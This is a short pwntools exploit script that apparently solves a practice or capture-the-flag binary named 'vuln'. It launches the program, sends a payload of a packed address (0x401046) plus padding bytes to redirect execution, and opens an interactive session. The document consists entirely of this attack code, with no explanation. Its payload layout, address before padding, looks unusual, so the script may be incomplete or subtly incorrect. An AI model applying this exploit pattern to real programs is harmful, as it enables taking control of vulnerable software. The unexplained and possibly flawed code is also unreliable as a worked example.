from pwn import *
p=process('./vuln')
payload=p64(0x401046)+b'a'*8
p.sendline(payload)
p.interactive()
